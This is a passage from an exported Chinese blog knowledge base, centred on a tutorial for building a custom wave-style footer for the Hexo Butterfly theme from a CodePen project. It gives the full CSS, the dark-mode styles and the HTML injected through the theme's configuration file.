                        </li>
                        
                        <li data-target-id="1308325830">
                            <a href="#1308325830">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>在你的 Hexo 博客上加入进度条</span>
                                
                                <div class="record-links-context hover">
                                    <p>加入进度条：<a href="#1308325830" title="在你的 Hexo 博客上加入进度条" class="record-link highlight">在你的 Hexo 博客上加入进度条</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2958737902">
                            <a href="#2958737902">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</span>
                                
                                <div class="record-links-context hover">
                                    <p>我的工作流：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link highlight">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a>、<a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2966071784">
                            <a href="#2966071784">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>server、sqlite 朋友圈部署方案</span>
                                
                                <div class="record-links-context hover">
                                    <p>部署友链朋友圈：<a href="#2966071784" title="server、sqlite 朋友圈部署方案" class="record-link highlight">server、sqlite 朋友圈部署方案</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <p>本文由原 <a href="#414962704" title="Hexo 博客的写作与装饰" class="record-link highlight">Hexo 博客的写作与装饰</a> 拆分而来。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="152796589" class="record">
            <header>
                <h1 class="record-title">Butterfly 自定义页脚（不修改主题源码）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CodePen');">CodePen</button>
                    
                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                    <button class="btn" onclick="activeTag('HTML');">HTML</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/10/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/fffootercover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>利用 CodePen 项目美化主题的页脚，不修改主题代码。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>91b7dad</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!note] 文章重要更新 <code>240803</code></p>
<ul>
<li>简化教程，直接贴源码</li>
<li>适配任何博客背景，对背景色无要求。文章圆满。</li>
</ul>
</blockquote>
<blockquote>
<p>[!success] 本文已收录至 <a href="https://butterfly.zhheo.com/">Butterfly 主题美化教程</a></p>
</blockquote>
<p><a href="https://codepen.io/trending">Trending - CodePen</a> 是个好东西，利用里面现成的项目，我们可以尝试更换 Butterfly 主题的页脚。</p>
<p>在官方文档中 <a href="https://butterfly.js.org/posts/4aa8abbe/#%E9%A0%81%E8%85%B3%E8%87%AA%E5%AE%9A%E7%BE%A9%E6%96%87%E6%9C%AC">Butterfly 安裝文檔(三) 主題配置-1 | Butterfly</a>（阅读本文务必先阅读这一部分），给出了自定义页脚的修改方式，但这种方法只适合写写版权信息、备案号这些，不适合高级定制。接下来我将介绍利用 CodePen 项目定制页脚的方法。</p>
<p>本文使用的项目：<a href="https://codepen.io/poojanahelia/pen/Exabvdy">Responsive footer, Responsive footer with social media icons, Attractive responsive footer (codepen.io)</a></p>
<p>项目预览：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230710235028.png" alt="image.png"></p>
<p>移植到本博客后预览：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/202408031704229.webp" alt="image.png"></p>
<h1>基本思路</h1>
<p>把 CodePen 项目中 footer 内的内容填入主题配置文件 custom_text 字段（详看 <a href="https://butterfly.js.org/posts/4aa8abbe/#%E9%A0%81%E8%85%B3%E8%87%AA%E5%AE%9A%E7%BE%A9%E6%96%87%E6%9C%AC">Butterfly 安裝文檔(三) 主題配置-1 | Butterfly</a>）</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711000055.png" alt="image.png|500"></p>
<p>挑选项目样式内容，复制到新建的 CSS 文件中并将其引入你的主题。Butterfly 主题的方法为在主题配置文件的 inject 部分引入 CSS，如：</p>
<pre><code class="language-yaml">inject:
  head:
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;your css&quot;&gt;
  bottom:
    - &lt;script src=&quot;your js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>下文附我的完整 CSS 文件，和注入的内容</p>
<h1>CSS 样式文件</h1>
<p>我对原项目的改进点：</p>
<ul>
<li>解决边框问题</li>
<li>不同宽度屏幕的适应</li>
<li>改进波浪效果，使其在不同博客背景中均能得到很好的展现。</li>
</ul>
<pre><code class="language-css">
#footer-wrap {
    font-family: 'Roboto', sans-serif;
    padding: 0;
}


#footer {
    background-color: rgba(0,0,0,0); /* 修改透明色 */
    color: #fff;
    padding: 0;
}

.footer-logo {
    color: white;
}

.footer-wave-svg {
    height: 50px;
    width: 100%;
    transform: scale(-1, -1) translateY(-10px); /*;*/
}

.footer-wave-path {
    fill: #177ecd;
}

.footer-content {
    margin-left: auto;
    margin-right: auto;
    max-width: 1230px;
    padding: 40px 15px 450px;
    position: relative;
}

.footer-content-column {
    box-sizing: border-box;
    float: left;
    padding-left: 15px;
    padding-right: 15px;
    width: 100%;
    color: #fff;
}

.footer-content-column ul li a {
    color: #fff;
    text-decoration: none;
}

.footer-logo-link {
    display: inline-block;
}

.footer-menu {
    margin-top: 15px;
}

.footer-menu-name {
    color: #fffff2;
    font-size: 15px;
    font-weight: 900;
    letter-spacing: .1em;
    line-height: 18px;
    margin-bottom: 0;
    margin-top: 0;
    text-transform: uppercase;
}

.footer-menu-list {
    list-style: none;
    margin-bottom: 0;
    margin-top: 10px;
    padding-left: 0;
}

.footer-menu-list li {
    margin-top: 5px;
}

.footer-call-to-action-description {
    color: #fffff2;
    margin-top: 10px;
    margin-bottom: 20px;
}

.footer-call-to-action-button:hover {
    background-color: #fffff2;
    color: #00bef0;
}

.button:last-of-type {
    margin-right: 0;
}

.footer-call-to-action-button {
    background-color: #027b9a;
    border-radius: 21px;
    color: #fffff2;
    display: inline-block;
    font-size: 11px;
    font-weight: 900;
    letter-spacing: .1em;
    line-height: 18px;
    padding: 12px 30px;
    margin: 0 10px 10px 0;
    text-decoration: none;
    text-transform: uppercase;
    transition: background-color .2s;
    cursor: pointer;
    position: relative;
}

.footer-call-to-action {
    margin-top: 17px;
}

.footer-call-to-action-title {
    color: #fffff2;
    font-size: 14px;
    font-weight: 900;
    letter-spacing: .1em;
    line-height: 18px;
    margin-bottom: 0;
    margin-top: 0;
    text-transform: uppercase;
}

.footer-call-to-action-link-wrapper {
    margin-bottom: 0;
    margin-top: 10px;
    color: #fff;
    text-decoration: none;
}

.footer-call-to-action-link-wrapper a {
    color: #fff;
    text-decoration: none;
}


.footer-social-links {
    bottom: -1px;
    height: 54px;
    position: absolute;
    right: 0;
    width: 236px;
}

.footer-social-amoeba-svg {
    height: 54px;
    left: 0;
    display: block;
    position: absolute;
    top: 0;
    width: 236px;
}

.footer-social-amoeba-path {
    fill: #027b9a;
}

.footer-social-link.email {
    height: 41px;
    left: 4px;
    top: 14px;
    width: 41px;
}

.footer-social-link {
    display: block;
    padding: 10px;
    position: absolute;
}

.hidden-link-text {
    position: absolute;
    clip: rect(1px 1px 1px 1px);
    clip: rect(1px, 1px, 1px, 1px);
    -webkit-clip-path: inset(0px 0px 99.9% 99.9%);
    clip-path: inset(0px 0px 99.9% 99.9%);
    overflow: hidden;
    height: 1px;
    width: 1px;
    padding: 0;
    border: 0;
    top: 50%;
}

.footer-social-icon-svg {
    display: block;
}

.footer-social-icon-path {
    fill: #fffff2;
    transition: fill .2s;
}

.footer-social-link.fish {
    height: 47px;
    left: 121px;
    top: 13px;
    width: 47px;
}

.footer-social-link.rss {
    height: 43px;
    left: 178px;
    top: 10px;
    width: 43px;
}

.footer-social-link.github {
    height: 62px;
    left: 54px;
    top: -4px;
    width: 62px;
}

.footer-copyright {
    background-color: #027b9a;
    color: #fff;
    padding: 15px 30px;
    text-align: center;
}

.footer-copyright-wrapper {
    margin-left: auto;
    margin-right: auto;
    max-width: 1200px;
}

.footer-copyright-text {
    color: #fff;
    font-size: 13px;
    font-weight: 400;
    line-height: 18px;
    margin-bottom: 0;
    margin-top: 0;
}

.footer-copyright-link {
    color: #fff;
    text-decoration: none;
}

.footer-content-div{
    background: #177ecd
}

.footer-svg-div{
    width: 100%;
    max-height: 200px;
}

/* Media Query For different screens */
@media (min-width: 320px) and (max-width: 479px) {
    /* smartphones, portrait iPhone, portrait 480x320 phones (Android) */
    .footer-content {
        margin-left: auto;
        margin-right: auto;
        max-width: 1230px;
        padding: 40px 15px 649px;
        position: relative;
    }

    /* 不展示logo */
    .footer-logo{
        display: none;
    }
}

@media (min-width: 480px) and (max-width: 599px) {
    /* smartphones, Android phones, landscape iPhone */
    .footer-content {
        margin-left: auto;
        margin-right: auto;
        max-width: 1230px;
        padding: 40px 15px 738px;
        position: relative;
    }

    .footer-logo{
        padding-left: 177px; /* Qlogo 稍微偏移一点 */
        padding-right: 170px;
    }
}

@media (min-width: 600px) and (max-width: 800px) {
    /* portrait tablets, portrait iPad, e-readers (Nook/Kindle), landscape 800x480 phones (Android) */
    .footer-content {
        margin-left: auto;
        margin-right: auto;
        max-width: 1230px;
        padding: 40px 15px 758px;
        position: relative;
    }



}

@media (min-width: 801px) {
    /* tablet, landscape iPad, lo-res laptops ands desktops */

}

@media (min-width: 1025px) {
    /* big landscape tablets, laptops, and desktops */

}

@media (min-width: 1281px) {
    /* hi-res laptops and desktops */

}


@media (min-width: 760px) {
    .footer-content {
        margin-left: auto;
        margin-right: auto;
        max-width: 1230px;
        padding: 10px 15px 237px;
        position: relative;
    }



    .footer-content-column {
        /*五列的话 19.99 %*/
        width: 24.99%;
    }
}

@media (min-width: 568px) {

}

@media (min-width: 600px) and (max-width: 760px) {
    /* 在这里编写适用于小屏幕的样式 */
    .footer-logo{
        padding-left: 212px; /* Qlogo 稍微偏移一点 */
        padding-right: 204px;
    }
}

</code></pre>
<h1>夜间模式</h1>
<p>Butterfly 有夜间模式，为了实现更好的波浪效果，建议增加以下 CSS 字段：</p>
<pre><code class="language-css">/* 页脚波浪的颜色 */
[data-theme='dark'] .footer-wave-path {
    fill: #0f3858;
}
[data-theme='dark'] .footer-content-div {
    background-color: #0f3858;
}

/* 页脚海底的颜色 */
[data-theme='dark'] .footer-copyright {
    background-color: #104e5e;
}
[data-theme='dark'] .footer-social-amoeba-path {
    fill: #104e5e;
}

</code></pre>
<p>预览：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711005624.png" alt="image.png"></p>
<p>关于夜间模式的问题详见：<a href="#4033695206" title="Butterfly 夜间模式变换顶部网站图标" class="record-link ">Butterfly 夜间模式变换顶部网站图标</a></p>
<h1>注入 HTML</h1>
<p>打开主题配置文件 <code>_config.butterfly.yml</code>，写入以下内容：</p>
<pre><code class="language-yaml"># Footer Settings
# --------------------------------------
footer:
  owner:
    enable: false
    since: 2022
  custom_text: |
    &lt;div class=&quot;footer-svg-div&quot;&gt;
      &lt;svg class=&quot;footer-wave-svg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 1200 100&quot; preserveAspectRatio=&quot;none&quot;&gt;
      &lt;path class=&quot;footer-wave-path&quot; d=&quot;M851.8,100c125,0,288.3-45,348.2-64V0H0v44c3.7-1,7.3-1.9,11-2.9C80.7,22,151.7,10.8,223.5,6.3C276.7,2.9,330,4,383,9.8 c52.2,5.7,103.3,16.2,153.4,32.8C623.9,71.3,726.8,100,851.8,100z&quot;&gt;&lt;/path&gt;
      &lt;/svg&gt;    
    &lt;/div&gt;
    &lt;div class=&quot;footer-content-div&quot; &gt;
    &lt;div class=&quot;footer-content&quot;&gt;
        &lt;div class=&quot;footer-content-column&quot;&gt;
            &lt;div class=&quot;footer-logo&quot;&gt;
                &lt;a class=&quot;footer-logo-link&quot; href=&quot;#&quot;&gt;
                    &lt;span class=&quot;hidden-link-text&quot;&gt;LOGO&lt;/span&gt;
                    &lt;img src=&quot;https://cdn.gallery.uuanqin.top/img/A%E5%85%A8%E7%99%BD%E6%97%A0%E5%AD%97.png&quot; style=&quot;height:40%; width:40%&quot;&gt;
                &lt;/a&gt;
            &lt;/div&gt;
            &lt;div class=&quot;footer-menu&quot;&gt;
                &lt;h2 class=&quot;footer-menu-name&quot;&gt;开始&lt;/h2&gt;
                &lt;ul id=&quot;menu-get-started&quot; class=&quot;footer-menu-list&quot;&gt;
                    &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-product&quot;&gt;
                        &lt;a href=&quot;/sitemap.xml&quot;&gt;站点地图&lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        &lt;div class=&quot;footer-content-column&quot;&gt;
            &lt;div class=&quot;footer-menu&quot;&gt;
                &lt;h2 class=&quot;footer-menu-name&quot;&gt;快速链接&lt;/h2&gt;
                &lt;ul id=&quot;menu-company&quot; class=&quot;footer-menu-list&quot;&gt;
                    &lt;li class=&quot;menu-item menu-item-type-taxonomy menu-item-object-category&quot;&gt;
                        &lt;a href=&quot;/archives/&quot;&gt;时间轴&lt;/a&gt;&amp;nbsp;|&amp;nbsp;&lt;a href=&quot;/DO_NOT_render/cosmoscope/cosmoscope_trim.html&quot;&gt;关系图&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-product&quot;&gt;
                        框架&amp;nbsp;&lt;a href=&quot;https://hexo.io/zh-cn/&quot;&gt;Hexo&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-product&quot;&gt;
                        主题&amp;nbsp;&lt;a href=&quot;https://github.com/jerryc127/hexo-theme-butterfly&quot;&gt;Butterfly&lt;/a&gt;
                    &lt;/li&gt;
                    &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-product&quot;&gt;
                        &lt;a href=&quot;https://www.foreverblog.cn/&quot; rel=&quot;noopener external nofollow noreferrer&quot; target=&quot;_blank&quot; &gt; &lt;img class=&quot;img-foreverblog&quot; src=&quot;https://cdn.gallery.uuanqin.top/img/forever_logo_en_default_white.png&quot; alt=&quot;&quot; style=&quot;width:auto;height:21px;margin-top:6px&quot;&gt; &lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
    
        &lt;/div&gt;

        &lt;div class=&quot;footer-content-column&quot;&gt;
            &lt;div class=&quot;footer-menu&quot;&gt;
                &lt;h2 class=&quot;footer-menu-name&quot;&gt;法律声明&lt;/h2&gt;
                &lt;ul id=&quot;menu-legal&quot; class=&quot;footer-menu-list&quot;&gt;
                    &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-170434&quot;&gt;
                        &lt;a href=&quot;/pages/privacy.html&quot;&gt;隐私政策&lt;/a&gt;
                    &lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
            &lt;div class=&quot;footer-call-to-action&quot;&gt;
                &lt;h2 class=&quot;footer-call-to-action-title&quot;&gt;联系本站&lt;/h2&gt;
                &lt;ul id=&quot;menu-legal&quot; class=&quot;footer-menu-list&quot;&gt;
                    &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-170434&quot;&gt;
                        &lt;a href=&quot;/DO_NOT_render/wechatOA/index.html&quot;&gt;微信公众号&lt;/a&gt;
                    &lt;/li&gt;
    
                    &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-170434&quot;&gt;
                        &lt;a class=&quot;footer-call-to-action-link&quot; href=&quot;mailto:uuanqin@uuanqin.top&quot; target=&quot;_self&quot;&gt;
                            uuan&lt;span style=&quot;display:none&quot;&gt;@&lt;/span&gt;qi&lt;!-- &gt;@ --&gt;n@&lt;span style=&quot;display:none&quot;&gt;@&lt;/span&gt;uu&lt;!-- &gt;@. --&gt;an&lt;span style=&quot;display:none&quot;&gt;@&lt;/span&gt;qin.top
                        &lt;/a&gt;
                    &lt;/li&gt;
    
                &lt;/ul&gt;
            &lt;/div&gt;
    
        &lt;/div&gt;
        &lt;div class=&quot;footer-content-column&quot;&gt;
            &lt;ul id=&quot;menu-get-started&quot; class=&quot;footer-menu-list&quot;&gt;
                &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-product&quot;&gt;
                    &lt;a href=&quot;/pages/ai_policy.html&quot; &gt;&lt;img class=&quot;img-not-ai&quot; src=&quot;https://cdn.gallery.uuanqin.top/img/Written-By-Human-Not-By-AI-Badge-white.svg&quot; alt=&quot;Written by Human, Not by AI&quot;&gt;&lt;/a&gt;
                &lt;/li&gt;
                &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-product&quot;&gt;
                    &lt;a href=&quot;/pages/cc.html&quot; &gt;&lt;img src=&quot;https://cdn.gallery.uuanqin.top/img/by-nc-sa.svg&quot; alt=&quot;署名-非商业性使用-相同方式共享 4.0 国际&quot;&gt;&lt;/a&gt;
                &lt;/li&gt;
    
                &lt;li class=&quot;menu-item menu-item-type-post_type menu-item-object-product&quot;&gt;
                    ©2022-2024 By wuanqin
                &lt;/li&gt;
            &lt;/ul&gt;
        &lt;/div&gt;
    
        &lt;div class=&quot;footer-social-links&quot;&gt; &lt;svg class=&quot;footer-social-amoeba-svg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 236 54&quot;&gt;
            &lt;path class=&quot;footer-social-amoeba-path&quot; d=&quot;M223.06,43.32c-.77-7.2,1.87-28.47-20-32.53C187.78,8,180.41,18,178.32,20.7s-5.63,10.1-4.07,16.7-.13,15.23-4.06,15.91-8.75-2.9-6.89-7S167.41,36,167.15,33a18.93,18.93,0,0,0-2.64-8.53c-3.44-5.5-8-11.19-19.12-11.19a21.64,21.64,0,0,0-18.31,9.18c-2.08,2.7-5.66,9.6-4.07,16.69s.64,14.32-6.11,13.9S108.35,46.5,112,36.54s-1.89-21.24-4-23.94S96.34,0,85.23,0,57.46,8.84,56.49,24.56s6.92,20.79,7,24.59c.07,2.75-6.43,4.16-12.92,2.38s-4-10.75-3.46-12.38c1.85-6.6-2-14-4.08-16.69a21.62,21.62,0,0,0-18.3-9.18C13.62,13.28,9.06,19,5.62,24.47A18.81,18.81,0,0,0,3,33a21.85,21.85,0,0,0,1.58,9.08,16.58,16.58,0,0,1,1.06,5A6.75,6.75,0,0,1,0,54H236C235.47,54,223.83,50.52,223.06,43.32Z&quot;&gt;&lt;/path&gt;
        &lt;/svg&gt;
            &lt;a class=&quot;footer-social-link github&quot; href=&quot;https://github.com/uuanqin&quot; target=&quot;_blank&quot;&gt;
                &lt;span class=&quot;hidden-link-text&quot;&gt;Github&lt;/span&gt;
                &lt;svg class=&quot;footer-social-icon-svg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 32 32&quot;&gt;
                    &lt;path class=&quot;footer-social-icon-path&quot; d=&quot;M 16 4 C 9.371094 4 4 9.371094 4 16 C 4 21.300781 7.4375 25.800781 12.207031 27.386719 C 12.808594 27.496094 13.027344 27.128906 13.027344 26.808594 C 13.027344 26.523438 13.015625 25.769531 13.011719 24.769531 C 9.671875 25.492188 8.96875 23.160156 8.96875 23.160156 C 8.421875 21.773438 7.636719 21.402344 7.636719 21.402344 C 6.546875 20.660156 7.71875 20.675781 7.71875 20.675781 C 8.921875 20.761719 9.554688 21.910156 9.554688 21.910156 C 10.625 23.746094 12.363281 23.214844 13.046875 22.910156 C 13.15625 22.132813 13.46875 21.605469 13.808594 21.304688 C 11.144531 21.003906 8.34375 19.972656 8.34375 15.375 C 8.34375 14.0625 8.8125 12.992188 9.578125 12.152344 C 9.457031 11.851563 9.042969 10.628906 9.695313 8.976563 C 9.695313 8.976563 10.703125 8.65625 12.996094 10.207031 C 13.953125 9.941406 14.980469 9.808594 16 9.804688 C 17.019531 9.808594 18.046875 9.941406 19.003906 10.207031 C 21.296875 8.65625 22.300781 8.976563 22.300781 8.976563 C 22.957031 10.628906 22.546875 11.851563 22.421875 12.152344 C 23.191406 12.992188 23.652344 14.0625 23.652344 15.375 C 23.652344 19.984375 20.847656 20.996094 18.175781 21.296875 C 18.605469 21.664063 18.988281 22.398438 18.988281 23.515625 C 18.988281 25.121094 18.976563 26.414063 18.976563 26.808594 C 18.976563 27.128906 19.191406 27.503906 19.800781 27.386719 C 24.566406 25.796875 28 21.300781 28 16 C 28 9.371094 22.628906 4 16 4 Z &quot;&gt;&lt;/path&gt;
                &lt;/svg&gt;
            &lt;/a&gt;
            &lt;a class=&quot;footer-social-link email&quot; href=&quot;mailto:uuanqin@uuanqin.top&quot; target=&quot;_blank&quot;&gt;
                &lt;span class=&quot;hidden-link-text&quot;&gt;Email&lt;/span&gt;
                &lt;svg class=&quot;footer-social-icon-svg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 512 512&quot;&gt;
                    &lt;!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --&gt;
                    &lt;path class=&quot;footer-social-icon-path&quot; d=&quot;M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z&quot;/&gt;
                &lt;/svg&gt;
            &lt;/a&gt;
            &lt;a class=&quot;footer-social-link fish&quot; href=&quot;https://uuanqin.top/404.html&quot; target=&quot;_blank&quot;&gt;
                &lt;span class=&quot;hidden-link-text&quot;&gt;爱发电&lt;/span&gt;
                &lt;svg class=&quot;footer-social-icon-svg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 576 512&quot;&gt;
                    &lt;!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --&gt;
                    &lt;path class=&quot;footer-social-icon-path&quot; d=&quot;M180.5 141.5C219.7 108.5 272.6 80 336 80s116.3 28.5 155.5 61.5c39.1 33 66.9 72.4 81 99.8c4.7 9.2 4.7 20.1 0 29.3c-14.1 27.4-41.9 66.8-81 99.8C452.3 403.5 399.4 432 336 432s-116.3-28.5-155.5-61.5c-16.2-13.7-30.5-28.5-42.7-43.1L48.1 379.6c-12.5 7.3-28.4 5.3-38.7-4.9S-3 348.7 4.2 336.1L50 256 4.2 175.9c-7.2-12.6-5-28.4 5.3-38.6s26.1-12.2 38.7-4.9l89.7 52.3c12.2-14.6 26.5-29.4 42.7-43.1zM448 256a32 32 0 1 0 -64 0 32 32 0 1 0 64 0z&quot;/&gt;
                &lt;/svg&gt;
            &lt;/a&gt;
            &lt;a class=&quot;footer-social-link rss&quot; href=&quot;/atom.xml&quot; target=&quot;_blank&quot;&gt;
                &lt;span class=&quot;hidden-link-text&quot;&gt;RSS&lt;/span&gt;
                &lt;svg class=&quot;footer-social-icon-svg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 448 512&quot;&gt;
                    &lt;!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --&gt;
                    &lt;path class=&quot;footer-social-icon-path&quot; d=&quot;M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z&quot;/&gt;
                &lt;/svg&gt;
            &lt;/a&gt;
    
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;footer-copyright&quot;&gt;
        &lt;div class=&quot;footer-copyright-wrapper&quot;&gt;
            &lt;p class=&quot;footer-copyright-text&quot;&gt;
                &lt;a href=&quot;https://beian.miit.gov.cn/&quot; rel=&quot;noopener external nofollow noreferrer&quot;&gt;&lt;img class=&quot;icp-icon&quot; src=&quot;https://cdn.gallery.uuanqin.top/img/icp.ico&quot;&gt;&lt;span&gt;津ICP备2022002156号-1&lt;/span&gt;&lt;/a&gt;
                &amp;nbsp;|&amp;nbsp;&lt;a href=&quot;http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011202000621&quot; rel=&quot;noopener external nofollow noreferrer&quot;&gt;&lt;img class=&quot;icp-icon&quot; src=&quot;https://cdn.gallery.uuanqin.top/img/备案图标.png&quot;&gt;&lt;span&gt;津公网安备 12011202000621号&lt;/span&gt;&lt;/a&gt;
                &amp;nbsp;|&amp;nbsp;&amp;nbsp;
                &lt;span&gt;互联网违法和不良信息举报邮箱：
                  uuan&lt;span style=&quot;display:none&quot;&gt;@&lt;/span&gt;qi&lt;!-- &gt;@ --&gt;n@&lt;span style=&quot;display:none&quot;&gt;@&lt;/span&gt;uu&lt;!-- &gt;@. --&gt;an&lt;span style=&quot;display:none&quot;&gt;@&lt;/span&gt;qin.top
                &lt;/span&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
</code></pre>
<p>你就能得到本站一模一样的样式，接下来按序更改就行。</p>
<blockquote>
<p>[!hint] 更换社交图标</p>
<p>对应着项目 HTML 代码自己替换 SVG 代码更改社交图标。如果你是在 fontawesome 复制过来的话，注意几个地方：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230711001735.png" alt="image.png"></p>
<p>反正跟原来的对上就行。</p>
</blockquote>
<h1>后记</h1>
<p>一年后花了大半天解决波浪效果背景色问题，TMD 又是 CSS，吐槽吐槽吐槽！以后绝不碰前端！感谢讯飞星火支持简化开发！</p>
<h2>已知问题</h2>
<ul>
<li>[x] 目前仅适用于<strong>博客背景为默认色</strong>（白天白，夜晚黑）的情况。<code>240803</code> 解决。</li>
<li>[x] 移动端 Edge 打开浏览器的夜间模式，并勾选「所有网页均为深色主题」选项时，页脚波浪顶部有白条。但这是 Edge 的问题，该设置温馨提示「打开后某些网站会不美观」的提示。<code>230816</code> <code>240715</code></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="4033695206">
                            <a href="#4033695206">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 夜间模式变换顶部网站图标</span>
                                
                                <div class="record-links-context hover">
                                    <p>关于夜间模式的问题详见：<a href="#4033695206" title="Butterfly 夜间模式变换顶部网站图标" class="record-link highlight">Butterfly 夜间模式变换顶部网站图标</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <p>自定义页脚：<a href="#152796589" title="Butterfly 自定义页脚（不修改主题源码）" class="record-link highlight">Butterfly 自定义页脚（不修改主题源码）</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="4033695206" class="record">
            <header>
                <h1 class="record-title">Butterfly 夜间模式变换顶部网站图标</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
